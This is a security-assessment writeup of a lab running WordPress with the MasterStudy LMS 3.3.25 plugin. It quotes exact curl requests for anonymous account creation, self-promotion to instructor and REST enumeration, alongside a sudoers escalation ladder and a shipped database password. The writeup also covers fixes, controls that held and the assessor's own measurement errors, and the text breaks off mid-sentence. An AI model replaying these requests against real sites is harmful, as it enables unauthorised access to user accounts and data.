# 115 Master — writeup

**Engagement outcome: PARTIAL.** Unauthenticated access to the application was
reached and measured, and a WordPress privilege escalation was executed and
measured. **Code execution was not achieved, and neither `root` nor a reward
was obtained.** The sections below separate what was executed from what was
read, and what was not tested from what was discarded.

Everything quoted here was read or executed during this engagement. This
repository holds no lab artefacts, so a reader can check the reasoning and the
quoted evidence but cannot re-run the target — see `README.md`, "What
'resolvable' means here, precisely".

---

## What the artefact actually is

The queue line is `115|Master|medio|WordPress platform; admin-reach chain`
(`tooling/labs.manifest:60`). **The manifest's platform label is correct, and
that was verified from a version-bearing file in the artefact rather than
inherited.**

Platform description as published (`tooling/download-labs.sh list`, id 115):

> `115|Master|medio|Laboratorio para practicar la explotación de un WordPress vulnerable y escalada de privilegios en Linux.`

Read out of the artefact, layer
`97818003ffa808be6a4005bbbc712637838925c2d4245a8d1cbf416cf47d8ae0/layer.tar`:

| Fact | Value | Source (verbatim) |
|---|---|---|
| Base OS | Ubuntu 24.04 | image config label `org.opencontainers.image.version` = `24.04` |
| Services started | `service apache2 start && service mariadb start && tail -f /dev/null` | image `Cmd` |
| Docroot | `/var/www/html` | `etc/apache2/sites-available/000-default.conf:12` — `	DocumentRoot /var/www/html` |
| **WordPress (shipped)** | **6.5.5** | `var/www/html/wp-includes/version.php:19` — `$wp_version = '6.5.5';` |
| **WordPress (live at first request)** | **7.1.2** | same file, live container — `$wp_version = '7.1.2';` |
| **Vulnerable plugin** | **MasterStudy LMS 3.3.25** | `wp-content/plugins/masterstudy-lms-learning-management-system/masterstudy-lms-learning-management-system.php:10` — ` * Version: 3.3.25`; `:18` — `define( 'MS_LMS_VERSION', '3.3.25' );`; plugin `readme.txt:8` — `Stable tag: 3.3.25` |
| Other active plugins | `elementor`, `header-footer-elementor`, `akismet`, `wp-automatic`, `hello.php` | `wp_options.active_plugins` |
| Base image | single container, default bridge, no macvlan, no second host | `auto_deploy.sh:131` — `docker run -d --name $CONTAINER_NAME $IMAGE_NAME` |

**The two WordPress numbers are different facts and both are recorded.** The
artefact ships 6.5.5. The running instance read 7.1.2 within minutes of the
first request, because nothing disables the automatic updater and the container
reaches the update API:

- `grep -cE "AUTOMATIC_UPDATER_DISABLED|DISALLOW_FILE_MODS" /var/www/html/wp-config.php` → **0** (neither constant is defined)
- `getent hosts api.wordpress.org` inside the container → `2620:109:b00a::4206:2afb api.wordpress.org`

Core auto-updated 6.5.5 → 7.1.2. The **plugin did not move**:
`grep -nE "MS_LMS_VERSION| \* Version:"` on the live plugin file still returned
`3.3.25` on both lines. Only the two core numbers differ, and they mean
different things: 6.5.5 is what the image contains, 7.1.2 is what the target
was serving by the time it was attacked.

**A second WordPress tree is present and is not the target.**
`home/ubuntu/wordpress/` is a complete, separate WordPress installation owned
by `nobody:nogroup`, alongside `home/ubuntu/latest.tar.gz` (24,696,391 bytes,
`root/root`) — the tarball it was unpacked from. `/var/www/html` is the served
docroot; nothing in the Apache configuration points at `/home/ubuntu`.

### The escalation surface, read off the artefact

`etc/sudoers`, the last three lines, verbatim:

```
www-data ALL=(pylon) NOPASSWD: /usr/bin/php
pylon ALL=(mario) NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
mario ALL=(root) NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
```
(`etc/sudoers:59`, `:61`, `:63`)

Identities involved (`etc/passwd:13`, `:22`, `:23`):

```
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mario:x:1001:1001:mario,,,:/home/mario:/bin/bash
pylon:x:1002:1002:pylon,,,:/home/pylon:/bin/bash
```

**Two of the three rungs are not walkable, from the modes in the artefact.**
Directory and file metadata read from the layer tar headers:

```
0750  1001/1001    home/mario
0664  1001/1001    home/mario/pingusorpresita.sh
0750  1002/1002    home/pylon
0664  1002/1002    home/pylon/pylonsorpresita.sh
```

`etc/group:37` is `users:x:100:mario,pylon` — both users share group `users`,
which grants nothing here: `/home/mario` is `0750` owned `mario:mario`, so
`pylon` cannot even traverse it, and neither script is group- or
world-writable. So `pylon → mario` requires writing a file `pylon` cannot
reach, and `mario → root` requires writing a file `mario` cannot reach.

The only rung reachable from the webserver identity is
`www-data → pylon`, and it was **not exercised** — see *NOT tested*.

### Why a `.php` write would be code execution, had one been obtained

Read from the artefact, not assumed:

- `etc/apache2/mods-available/php8.3.conf:3-4`
  ```
  <FilesMatch ".+\.ph(?:ar|p|tml)$">
      SetHandler application/x-httpd-php
  ```
  A **server-level `FilesMatch`**, outside every `<Directory>`. `.php`,
  `.phtml` and `.phar` all execute anywhere under the docroot.
- `etc/apache2/apache2.conf:170-174`
  ```
  <Directory /var/www/>
  	Options Indexes FollowSymLinks
  	AllowOverride None
  	Require all granted
  </Directory>
  ```
  `AllowOverride None` means a per-directory `.htaccess` cannot speak for
  itself — the correct half of the lab-146 discriminator.
- The lab-146 trick itself is **absent**, with a count: `grep -rc "AddType.*x-httpd-php"`
  across the 34 config files under `etc/apache2/` returned **0 files with a
  non-zero count**. There is no global `AddType` mapping another extension to
  the PHP handler.

---

## Surface

```
$ nmap-equivalent: listening sockets, read from inside the container
tcp   LISTEN 0 511   0.0.0.0:80    0.0.0.0:*  users:(("apache2",pid=24,fd=3))
tcp   LISTEN 0 80    127.0.0.1:3306 0.0.0.0:*
```

Two sockets. **No SSH and no other host**, so the sudoers ladder is only
reachable from a webserver-side execution primitive. `3306` is bound to
loopback, not `0.0.0.0`. Checked beyond the TCP scan: no UDP listeners were
looked for with a protocol exchange — see *NOT tested*.

Apache workers run as `www-data`; the master runs as `root`:

```
$ ps -eo user,pid,comm | grep -E "apache2|PID"
USER         PID COMMAND
root          24 apache2
www-data      29 apache2
www-data      30 apache2
...
```

REST is reachable **only** through `?rest_route=`. The pretty form
`/wp-json/wp/v2/users` returns `404` (273 bytes) while
`/?rest_route=/wp/v2/users` returns `200` (1065 bytes) — a blind spot that
reads exactly like "the REST API is off".

```
$ curl -s "http://172.17.0.11/?rest_route=/"   →  217 routes
namespaces: ['oembed/1.0', 'masterstudy-lms/v2', 'stm-lms/v1', 'lms',
             'elementor/v1', 'wp/v2', 'wp-site-health/v1',
             'wp-block-editor/v1', 'wp-abilities/v1']
```

Route counts, computed from the index: `/masterstudy-lms/v2` = 58,
`/lms` = 10, `/stm-lms/v1` = 2.

Unauthenticated WordPress user enumeration, unauthenticated, count returned = 1:

```
$ curl -s "http://172.17.0.11/?rest_route=/wp/v2/users&per_page=100"
[{"id":1,"slug":"mario","name":"Mario", ... }]
```

The single WordPress administrator is **`mario`** — the same identity as Linux
uid 1001. The WordPress surface and the sudoers ladder are about the same two
people.

---

## The class

**Entry criterion:** the queue claims an "admin-reach chain". The question that
started it was *what does an unauthenticated visitor get, and how far does it
go?*

**Source that settled it:** `includes/Plugin.php:48`. The whole plugin REST
API is registered with the permission callback defaulted open:

```php
					array_merge(
						array(
							'methods'                     => $route->methods,
							'callback'                    => array( $this->router, 'handle' ),
							'permission_callback'         => '__return_true',
```

`__return_true` is the **default for every route** in the router, not a
per-route decision. Access control for all 58 `masterstudy-lms/v2` routes is
delegated entirely to a middleware pipeline (`includes/routes.php:10-19`).
That is a fragile design — the gate is nowhere in the route definition — and it
is the reason the controls had to be verified separately.

The namespace is `masterstudy-lms/v2`, not `stm-lms/v1`
(`includes/init.php:7-8`). I guessed `stm-lms/v1` first and got 404 on routes
that exist. That is recorded as an instrumentation defect, not as an absence.

---

## Chain

Every hop below was executed and every identity was **measured**, not assumed.

| # | → | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 1 | anonymous | HTTP to `admin-ajax.php` | no `Cookie` header sent; response `200` |
| 2 | `subscriber` (WP id 3) | `stm_lms_fast_register` creates an account **and signs the caller in** | `Set-Cookie: wordpress_logged_in_c0041c03b1eb70feeee616cd747b8814=probe115bexample-invalid%7C...; path=/; HttpOnly` |
| 3 | `subscriber` → `stm_lms_instructor` | `stm_lms_become_instructor` | `{"errors":[],"status":"success"}` |
| 4 | `stm_lms_instructor` (14 caps) | plugin REST + AJAX surface reachable | `users/me` → `id=3 roles=['stm_lms_instructor'] caps=14` |

### Hop 2 — unauthenticated account creation with a returned session

Nonce `stm_lms_fast_register` is served to anonymous visitors (§ *Controls*).
The handler (`_core/lms/classes/guest_checkout.php:97-98`, `:176`, `:185-193`):

```php
	public function fast_register() {
		check_ajax_referer( 'stm_lms_fast_register', 'nonce' );
```
```php
		$user = wp_create_user( sanitize_title( $data['email'] ), $data['password'], $data['email'] );
```
```php
			wp_signon(
				array(
					'user_login'    => $data['email'],
					'user_password' => $data['password'],
				),
				is_ssl()
			);
```

Executed:

```
$ curl -X POST "http://172.17.0.11/wp-admin/admin-ajax.php?action=stm_lms_fast_register&nonce=0d71518d6c" \
       -H 'Content-Type: application/json' \
       --data-binary '{"email":"probe115b@example.invalid","password":"Pr0be115xyz","additional":{}}'
{"status":"success","items":[]}          [200, 31 bytes]
```

The same call also proves `wp-login.php` accepts the credential afterwards
(`wordpress_logged_in` cookie count = 1). **No capability of the site
administrator is required at any point in this hop.**

### Hop 3 — self-promotion to instructor

`{"errors":[],"status":"success"}`, and the identity changed. Measured before
and after on the same account:

| | `roles` | capabilities | `manage_options` |
|---|---|---|---|
| after registration | `['subscriber']` | **3** | `None` |
| after `stm_lms_become_instructor` | `['stm_lms_instructor']` | **14** | `None` |

The 14 granted capabilities, read from `users/me?context=edit`:

```
delete_stm_lms_post True      edit_stm_lms_post True       read True
delete_stm_lms_posts True     edit_stm_lms_posts True      stm_lms_instructor True
list_users True               publish_stm_lms_posts True   upload_files True
delete_others_stm_lms_posts False  edit_others_stm_lms_posts False
read_private_stm_lms_posts False
```

Root cause: `_core/lms/classes/user.php:566-580` grants the role from the
request body when two options permit it, and neither is a control the caller
can be expected to know about:

```php
	public static function stm_lms_set_user_role( $user, $data ) {
		if ( ! empty( $data['become_instructor'] ) && $data['become_instructor'] ) {
			$register_as_instructor   = STM_LMS_Options::get_option( 'register_as_instructor', false );
			$instructor_premoderation = STM_LMS_Options::get_option( 'instructor_premoderation', false );

			if ( $register_as_instructor && ! $instructor_premoderation ) {
				wp_update_user(
					array(
						'ID'   => $user,
						'role' => 'stm_lms_instructor',
					)
				);
			}
		}
	}
```

`upload_files` and `list_users` are the two that matter downstream.

### Hop 4 — what the instructor identity reaches

Sweep of the plugin's **privileged** (`wp_ajax_`) actions, caller =
`stm_lms_instructor`, session verified live immediately before and after.
57 actions × 1 request each — the 57 for which I held a matching nonce.
Buckets reconcile exactly (18+23+5+11 = 57):

| Response shape | Count | Reading |
|---|---|---|
| `200` with a substantive body (>0 bytes) | **18** | handler executed and did work |
| `200` with a **0-byte** body | **23** | capability-denied `die`, **not** execution |
| `403` / `-1` | **5** | registered, nonce gate fired |
| `400` / `0` | **11** | `has_action()` false in that request |

The 18 that returned data include:

```
stm_lms_ban_user                             "saved"
stm_lms_get_users_submissions                {"total":1,"users":[{"id":3,...,"user_email":"probe115b@example.invalid",...
stm_lms_enterprise                           {"errors":[{"id":"required","field":"enterprise_name",...
stm_lms_update_user_status                   []
stm_lms_toggle_buying                        {"next":"","message":"All courses in the selected categories are enabl...
stm_lms_total_progress                       {"course":{"progress_percent":0},...
stm_lms_get_user_quizzes                     {"posts":[{"course_id":"0",...
stm_lms_logout                               "http:\/\/172.17.0.11\/index.php\/user-account\/"
```

`stm_lms_ban_user` returning `"saved"` and `stm_lms_get_users_submissions`
returning another user's email address are the reportable ones: a
self-promoted instructor reaches a user-moderation action and a user-enumeration
action.

**Correction to my own reading of this sweep, applied above:** I first counted
all 41 `200`s as "executed". Twenty-three of them have an empty body, and this
plugin denies by `die` on a failed `current_user_can()` — for example
`_core/includes/user_manager/UserManager.ImportUsers.php:12-14`:

```php
		if ( ! current_user_can( 'manage_options' ) ) {
			die;
		}

		check_ajax_referer( 'stm_lms_dashboard_import_users_to_course', 'nonce' );
```

A 0-byte `200` is a **silent denial** and is indistinguishable from a no-op at
the status-code level. The finding above uses the 18, not the 41.

---

## Findings

### F1 — Unauthenticated account creation returning a live session
**CWE-306** (missing authentication for critical function), **CWE-862**
(missing authorization).
`stm_lms_fast_register` creates a WordPress account and immediately calls
`wp_signon`, returning three `Set-Cookie` headers including a
`wordpress_logged_in_*` cookie. The only gate is a WordPress nonce, which for
a logged-out user is a constant derived from uid 0 and the action string — it
is published in the page source (§ F3) and is not a secret.
*Evidence:* response quoted in Hop 2; source at `guest_checkout.php:176`,
`:185-193`.
*Impact:* any anonymous internet client obtains an authenticated session on the
platform hosting the lab's content.
*Root cause:* a guest-checkout convenience function performs account creation
as a side effect of adding to a cart.
*Fix:* require an authenticated session, or at minimum an email-verification
step before the session is established; do not treat a uid-0 nonce as a gate.

### F2 — Unauthenticated privilege escalation: subscriber → LMS instructor
**CWE-269** (improper privilege management).
One unauthenticated POST creates a `subscriber`; a second promotes it to
`stm_lms_instructor`, tripling its capabilities from 3 to 14 and granting
`upload_files` and `list_users`. Measured before/after in the table in Hop 3.
*Impact:* the plugin's instructor surface — 18 privileged actions returning
data, including user moderation and user enumeration — becomes reachable by an
anonymous client.
*Root cause:* self-service role assignment gated on two stored options rather
than on approval (`user.php:566-580`).
*Fix:* require an administrator (or a moderated queue) to grant the instructor
role; never let the request body decide a role at registration time.

### F3 — Full administrative action-token bundle served to anonymous visitors
**CWE-200** (information exposure).
The public homepage embeds `stm_lms_nonces`, **119 entries**, covering the
plugin's entire administrative surface — including `stm_lms_ban_user`,
`stm_lms_save_user_info`, `wpcfto_save_settings`, `stm_lms_import_groups`,
`stm_lms_become_instructor`. Extracted: **119 keys, 119 values, 0 missing.**
*Impact:* removes the CSRF token as an obstacle to every one of these actions.
A nonce is a CSRF token, not an authentication control, but a token that is
published for every administrative action turns "possession of a token" into
"possession of the ability to call the endpoint" for anyone who is willing to
pass the capability checks.
*Root cause:* the nonce map is printed unconditionally rather than scoped to
the actions the current user may perform.
*Fix:* emit only the nonces for actions the current user is entitled to.

### F4 — Blanket `__return_true` permission callback on the entire plugin REST API
**CWE-862**.
`includes/Plugin.php:48` sets `'permission_callback' => '__return_true'` as the
**default** for every route the router registers, so all 58
`masterstudy-lms/v2` routes are declared public and rely entirely on a
middleware pipeline for access control. Nothing in the route definition states
that a route is protected.
*Impact:* measured as **not** exploitable in this engagement — the middleware
held (see *Controls*) — but the design makes a single mis-scoped route
unauthorised by default, and one already exists in the older namespace (F5).
*Fix:* default the callback to a denial and require each route to opt in to
public access.

### F5 — Unauthenticated information disclosure, no ownership predicate
**CWE-639** (authorisation bypass through user-controlled key),
**CWE-200**.
`_core/lms/route.php:53-58` registers a course-list endpoint whose permission
callback is unconditional and which takes an arbitrary author id:

```php
		register_rest_route(
			'lms',
			'/stm-lms-user/course-list',
			array(
				'permission_callback' => '__return_true',
```

Executed, unauthenticated, no cookies:

```
$ curl -s "http://172.17.0.11/?rest_route=/lms/stm-lms-user/course-list&author_id=1"
[200, 225 bytes]
[{"id":"19","title":"Curso de Python desde cero e intensivo"},
 {"id":"36","title":"Curso de bases de datos Mong..."}]
```

The same shape at `_core/lms/classes/course.php:62-68` exposes course search
(`__return_true`) — `GET /?rest_route=/stm-lms/v1/courses&search=a` → `200`,
549 bytes, unauthenticated.
*Impact:* any visitor can enumerate the course catalogue attributed to any
author id. Verified for `author_id=1`; ids were **not** swept exhaustively.
*Root cause:* a public callback with a user-controlled lookup and no
authorisation check on the object.
*Fix:* gate on the object's own visibility rules, or drop the endpoint.

### F6 — Missing PHP extension causes unauthenticated-reachable 500s
**CWE-1104** / availability defect in the shipped configuration.
`php -m` inside the running container lists no `mbstring`. The plugin calls
`mb_strlen()` and `mb_strimwidth()` unconditionally in
`_core/lms/helpers.php:232-235`:

```php
	if ( ! empty( intval( $length ) ) ) {
		$w_length = mb_strlen( $word );
		if ( $w_length > $length ) {
			$word = mb_strimwidth( $word, 0, $length, $affix );
```

Apache error log, verbatim, first line only:

```
[Wed Sep 30 10:32:30.165822 2026] [php:error] [pid 288] [client 172.17.0.1:55882] PHP Fatal error:  Uncaught Error: Call to undefined function mb_strimwidth() in /var/www/html/wp-content/plugins/masterstudy-lms-learning-management-system/_core/lms/helpers.php:235
```

Reached through `stm_lms_minimize_word()` ←
`themes/ms-lms-starter-theme/templates/header/parts/authorization-links.php:58`
← the theme header, i.e. **any page render for a signed-in user**. The
homepage returned `500` at one point during the engagement and `200` at
another.
*Impact:* availability, and — more damaging for an assessment — the target's
own behaviour becomes **non-deterministic**, which silently corrupts every
before/after measurement taken against it (see *Instrumentation defects*).
*Root cause:* the plugin declares `Requires PHP: 7.4` (plugin `readme.txt:7`)
and calls `mb_*` without checking the extension is loaded.
*Fix:* install `php8.3-mbstring`, and guard the `mb_*` calls with
`function_exists()`.

### F7 — Privileged-action reachability is non-deterministic
**CWE-670** (always-incorrect control flow) / design defect.
The plugin's privileged AJAX actions are registered as a **side effect of a
class file being loaded** — `_core/lms/classes/user.php:4` is
`STM_LMS_User::init();` executed at file scope, and that file is pulled in by
an autoloader. Whether `has_action("wp_ajax_stm_lms_change_avatar")` is true at
the moment `admin-ajax.php` evaluates it therefore depends on whether something
earlier in the same request happened to reference the class.

Measured, same user, same role, same nonces, two sessions:

| Measurement | Session A | Session B |
|---|---|---|
| privileged actions returning `200` with a body | **41** | **1** |
| returning `400` / `0` (`has_action()` false) | 0 | **32** |
| re-test of the 41 that worked in A | — | **40 of 41 regressed** |

A control action that provably executed in session A
(`stm_lms_become_instructor`, `200 {"errors":[],"status":"success"}`) returned
`400` / `0` in session B. Repeated trials, N=5 per action, then showed the
whole class stably flipped — so this is a **state** difference between sessions,
not per-request jitter. Core version and plugin version were identical in both
(`7.1.2` and `3.3.25`), and the plugin was active with all 1,276 PHP files
present, so the plugin was loading: the REST namespace was present and its
middleware returned its normal `401`.
*Impact:* an endpoint's reachability cannot be assessed from a single probe, and
an assessor can easily record the wrong answer in either direction. This is a
finding about the target, not only about my tooling.
*Root cause:* registering hooks as a side effect of lazy class loading rather
than from an explicit, unconditional bootstrap.
*Fix:* register all actions from a file that is always included.

### F8 — Default WordPress salts shipped in the docroot configuration
**CWE-798** (hard-coded credentials).
`var/www/html/wp-config.php:51-58` ships all eight secret keys as
`put your unique phrase here`, and `:29` ships a plaintext database password:

```
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'DB_PASSWORD', 'si1VxJ242Gqyv9e' );
```

With default salts, the values that sign `wordpress_logged_in_*` cookies are
derived from constants an attacker already knows, so a cookie can be forged for
any user id without the password. **This was not exploited** — it is reported
because it is present in the artefact and is a real weakness of the
configuration, not of my chain. Its exploitability was **not tested**.
*Fix:* generate unique salts at install time; never ship placeholder values.

### F9 — Database credentials and platform details in a version-controlled-looking config
Not filed as a separate finding: `wp-config.php` is served through the PHP
handler and is not readable over HTTP (verified: the request returns the
application, not the file). It became reachable only because F8's salts and
the plugin's `wp-config` handling put it in scope. Recorded here so it is not
mistaken for a web-exposed secret.

---

## Controls that held

Each control is listed with the positive control that proves the detector can
fire. A negative from a detector that has never seen a success is not evidence.

| Control | How it was proven to work | Measured result |
|---|---|---|
| REST authentication middleware (`Authentication.php:9`, `if ( ! is_user_logged_in() )`) | The `Guest` group gives a **byte-distinguishable** second shape (`403`, 77 bytes, `rest_nonce_missed`) on the same unauthenticated request class, so a `401` is attributable to the auth middleware and not to a blanket block | **21 of 21** probed `masterstudy-lms/v2` routes returned `401` with a byte-stable 93-byte body `{"error_code":"unauthorized_access","message":"Only authorized Users can access this route!"}`. Anonymity was the treatment; the `403`/`77`-byte `Guest` response is the positive control that a different gate is distinguishable |
| AJAX nonce gate | A deliberately nonexistent action name is the control: it must return the *other* shape | `__control_nonexistent_115` → `400` / `0` / 1 byte. All **23 of 23** `nopriv` plugin actions returned `403` / `-1` (handler reached, nonce check fired). Discriminator proven in both directions |
| Object-ownership middleware (`PostGuard.php:15`) | A **positive** case: a course I own must be allowed, otherwise "403 everywhere" would be indistinguishable from a correct guard | Course **46** (created by me) → `200`; course **19** (owned by `mario`) → `403 {"error_code":"forbidden","message":"Forbidden!"}`. The 200 is the control that proves the 403 is a decision and not a blanket denial |
| Role separation | `manage_options` absent while `upload_files` present shows the caps are a real, differentiated set | `manage_options = None`, `upload_users/edit_users/install_plugins/edit_plugins = None` — **8 named capabilities checked, 7 absent**, `read` and the 11 `stm_lms_*` caps present |
| `manage_options` gate on bulk user import | The endpoint is reachable and returns a body, so a denial is visible rather than silent | `stm_lms_dashboard_import_users_to_course` → `200` with a **0-byte** body = `die` at `ImportUsers.php:12`. I hold no `manage_options`, so the gate held |
| WordPress upload type restriction | Tried the four suffixes the server would execute, and checked the **filesystem**, not just the response | 4 filenames (`.php`, `.phtml`, `.phar`, `.php5`) → 4 × `rest_upload_unknown_error`; `find` for `*.php`, `*.phtml`, `*.phar` under `wp-content/uploads` → **0 files** |
| Avatar upload extension allowlist | The validator is reached and returns a structured error, so the check is live | `_core/lms/classes/user.php:1681-1683` — `'file' => 'required_file|extension,png;jpg;jpeg'`. I initially mis-read the sink below it as having no allowlist; the validator is above it. Recorded as an instrumentation defect |
| Absence of a global `AddType` PHP mapping (the lab-146 shape) | Read the whole server config tree | `grep -rc "AddType.*x-httpd-php"` over 34 files under `etc/apache2/` → **0 files with a non-zero count** |

---

## NOT tested

A count of zero means the check is **untested**, not that it found nothing.

1. **The `www-data → pylon` sudoers rung was never executed.** No code
   execution as `www-data` was obtained, so `sudo -u pylon /usr/bin/php` was
   never run and the `uid`/`euid` pair at that hop is **unmeasured**. Ids
   tried: 0. The rung's existence is read from `etc/sudoers:59`; its
   exploitability is untested.
2. **The `pylon → mario` and `mario → root` rungs were never executed.** Not
   attempted, because the prerequisite hop was never reached. Ids tried: 0.
   Their apparent non-walkability is an **inference from file modes in the
   artefact**, not a measured result.
3. **No setuid binary audit.** `find` for mode-4xxx executables was not run.
   Candidates examined: 0.
4. **No UDP enumeration.** `ss -lntup` was read (2 TCP listeners, 0 UDP) but
   `/proc/net/udp` was not parsed and no protocol exchange was attempted.
   Bindings checked: 0 of the UDP table.
5. **No credential attack** against WordPress login, `xmlrpc.php`, or the
   database. Candidates tested: 0. `xmlrpc.php` exists in the docroot and was
   **not** probed.
6. **`wp-automatic` and `elementor` were not assessed.** Their versions were
   not read from the artefact and their surfaces were not swept.
7. **F8 (default salts → cookie forgery) was not exploited.** No forged cookie
   was attempted. Forgeries attempted: 0.
8. **The 54 privileged actions for which I held no nonce were never called.**
   111 privileged `wp_ajax_` actions exist in the plugin source; I had nonces
   for 57 and tested 57. **54 are untested**, not negative.
9. **F5 was verified for `author_id=1` only.** Author ids tried: 1. Whether
   the endpoint exposes other objects, or accepts ids that do not exist, is
   untested.
10. **The second WordPress tree at `/home/ubuntu/wordpress` was not assessed.**
    It is present, owned `nobody:nogroup`, and not served by the Apache
    configuration read. Whether anything reaches it is untested.
11. **The four `Pro` add-on classes** whose absence caused fatals
    (`MasterStudy\Lms\Pro\addons\...`, seen in the error log) were not
    investigated beyond the fatal messages.

---

## Discarded with reason

| Discarded | Reason |
|---|---|
| `.htaccess` in `wp-content/uploads` to enable the PHP handler | `apache2.conf:172` is `AllowOverride None`. A per-directory override cannot speak. Ruled out from the config, with the directive quoted |
| Uploading a `.php` avatar | `user.php:1681-1683` restricts the extension to `png;jpg;jpeg` before the sink at `:1729-1737` is reached |
| `POST /masterstudy-lms/v2/courses/{id}/curriculum/import` as a file-write | Read the controller. It validates `material_ids` + `section_id` and calls `CurriculumMaterialRepository::import()`; `grep` for `wp_remote_get|download_url|wp_insert_attachment|wp_handle_sideload|file_put_contents|copy(` across `includes/Http/Controllers/Course/` and `includes/Repositories/` returned **0 matches**. No fetch, no write |
| Role injection through the registration JSON body | Both registration paths call `wp_create_user($login, $pass, $email)` with no role argument (`guest_checkout.php:176`, `user.php:389`). Measured outcome was `subscriber`; `user.php:314`'s `extract($data)` did not yield a role write |
| Mass assignment of arbitrary user meta | `user.php:1249-1252` gates on `current_user_can( 'edit_user', $user_id )` before the `update_user_meta` loop |
| `stm_lms_dashboard_import_users_to_course` for privilege escalation | Gated by `current_user_can('manage_options')` at `ImportUsers.php:12`; and `update_user_names()` writes only `first_name`/`last_name` (`:75-80`), no role |

---

## Instrumentation defects

The most valuable section, per the runbook. Five of these produced a
well-formed answer that was wrong.

### D1 — My harness silently dropped the session cookie, and 57 endpoints answered `0`
`http.cookiejar.MozillaCookieJar` was loaded from a curl cookie file and
silently produced an **empty** cookie set. I verified this only because I
printed the request: `has_cookie_header = False`. The entire 57-action
privileged sweep therefore ran **as an anonymous visitor**, and returned
`400` / `0` — the exact shape that means "no such action". I had drafted the
reading "43 privileged actions are not registered", with a plausible mechanism
ready to explain it, before the cookie check caught it.
The 13 actions that *did* answer `403` / `-1` were exactly the 13 that have
`nopriv` variants — which is the tell, and it is the same tell as the
method's §1: an instrument that has only ever seen one class of target
generalises that class into a conclusion.
**Rule:** a session must be asserted per request, not per script. A harness
that cannot prove it is authenticated must refuse to produce an authorisation
negative. The fixed harness asserts a non-empty `Cookie` header and prints its
length before the first request.

### D2 — `400` / `0` read as "not registered" without a control
`400` with a 1-byte body is WordPress's `has_action()` miss, and it is
**byte-identical** to a capability-denied or no-op response from some handlers.
I confirmed the body is genuinely 1 byte with `curl` (and noted that Apache's
access log records `473` for the same responses — the log and the wire
disagree, and I relied on the wire). Every `400` / `0` in this writeup is
reported only because a nonexistent-action control returns the same shape, so
the reading is "this request did not reach a handler", never "this handler
denied me".

### D3 — A 0-byte `200` counted as execution
I reported 41 of 57 privileged actions as "200 OK" for a self-promoted
instructor. Twenty-three of those bodies are **0 bytes**, and this plugin
denies with a bare `die` (`ImportUsers.php:12-14`). A 0-byte `200` is a silent
denial that is indistinguishable from a no-op by status code alone. The finding
was rewritten to the **18** actions that returned substantive bodies.
**Rule:** bucket by body length, not by status. `200` is not "it worked".

### D4 — I guessed the REST namespace and read 404s as a missing surface
`includes/routes.php` is full of `$router->get(...)` calls, and the older
namespace `stm-lms/v1` also exists, so I probed `stm-lms/v1` first and got
`404` on routes that genuinely exist. The namespace is
`masterstudy-lms/v2` (`includes/init.php:7-8`). The correct enumeration —
`GET /?rest_route=/` and reading the index — showed **58** v2 routes that my
guess had hidden entirely.
**Rule:** enumerate the index before probing paths. A `404` from a guessed path
is a statement about the guess.

### D5 — I read the tail of a function and missed the guard above it
`stm_lms_change_avatar` ends in an extension taken verbatim from the client
filename and a `move_uploaded_file()` into the docroot
(`user.php:1729-1737`) — and with a server-level `FilesMatch` making `.php`
execute (`php8.3.conf:3-4`), that reads like an immediate RCE. I was about to
file it. The allowlist is **48 lines earlier**, at `user.php:1681-1683`:
`'file' => 'required_file|extension,png;jpg;jpeg'`.
**Rule:** read the whole handler, from the hook registration down, before
naming a sink. A sink is only a sink once every guard above it is accounted
for.

### D6 — The target changed under me, twice, and I nearly measured a moving object
`wp-cron.php` auto-updated WordPress core from the shipped 6.5.5 to 7.1.2
before the first attack request, because nothing sets
`AUTOMATIC_UPDATER_DISABLED` and the container resolves `api.wordpress.org`.
The plugin did not move (still 3.3.25), and both core numbers are recorded
because they mean different things. Separately, the missing `mbstring` (F6)
made the homepage alternate between `200` and `500` mid-engagement.
**Rule:** pin and record the version from the artefact, record the live version
separately, and re-read the version after any long gap before comparing two
measurements.

### D7 — Nonces are bound to the session token, and I attributed the failure to the target
Mid-engagement I re-logged-in and reused the previous session's nonce bundle.
Every action then returned `403` / `-1`, which reads as "the controls tightened".
It was my stale bundle. The giveaway was the opposite of what I assumed: a
nonce failure returns `403`, whereas "unregistered" returns `400`, so the two
were distinguishable the whole time and I had collapsed them.
**Rule:** after any re-authentication, regenerate tokens. A `403` that appears
en masse after a login is your own session, not a new control.

---

## Reward

**No `FLAG{}` or equivalent reward exists on this lab.** Measured, not assumed.

Positive control first, so the search is known to be capable of finding a
string that is present:

```
$ grep -rl "wp_version" /var/www/html/wp-includes/version.php
/var/www/html/wp-includes/version.php
CONTROL-FIRED
```

| Search | Work count | Result |
|---|---|---|
| Filesystem sweep for `FLAG{`, `flag{`, `CTF{`, `HTB{` across `/var/www`, `/home`, `/root`, `/opt`, `/srv`, `/etc` | **11,993 files, 325,435,613 bytes** | 2 files matched; **both inspected and both false positives** — CSS class selectors, e.g. `}.lms-courses-preset.status-label--type-flag{--lms-status--mask-image:url("data:image` |
| Database sweep of the text-bearing WordPress tables | **392 rows scanned** (`wp_options` 223, `wp_posts` 36, `wp_postmeta` 78, `wp_usermeta` 55) | **0 hits** in all four |
| HTTP surface sweep | **9 endpoints** (home, `pages`, `posts`, `media`, `users`, `readme.html`, `license.txt`, `wp-admin/`, REST index) | **0 endpoints** containing `FLAG{` |

No reward is invented to fill the gap. The authoritative column for whether a
lab carries a reward is the `FLAG{}` column of
[`corpus/INDEX.md`](../INDEX.md) — this writeup makes no claim about its
position in any sequence, because a position inside a sequence this engagement
is part of cannot be computed from inside it.

---

## Lab design observations

- The lab is thematically coherent: the flagship course is *"Curso de Escaladas
  de Privilegios en Linux"* (Linux privilege escalation), and the two Linux
  users, `mario` and `pylon`, own hand-written "surprise" scripts whose names
  (`pingusorpresita.sh`, `pylonsorpresita.sh`) are the author's own joke. The
  WordPress administrator and the Linux uid 1001 are the same person, which
  makes the narrative hang together.
- The intended escalation is almost certainly the three-rung sudoers ladder
  `www-data → pylon → mario → root`. As shipped, the two upper rungs point at
  scripts in directories the predecessor cannot write or even traverse
  (`0750`, `0664`, no group or world write). The lab author may intend a
  different lever to open the middle rung — for instance the `www-data → pylon`
  rule allows `/usr/bin/php` with **no argument restriction**, so `pylon` can be
  used to run PHP from a location `pylon` can write, which is worth a dedicated
  look. That was not tested here.
- `AUTOMATIC_UPDATER_DISABLED` being unset makes every engagement against this
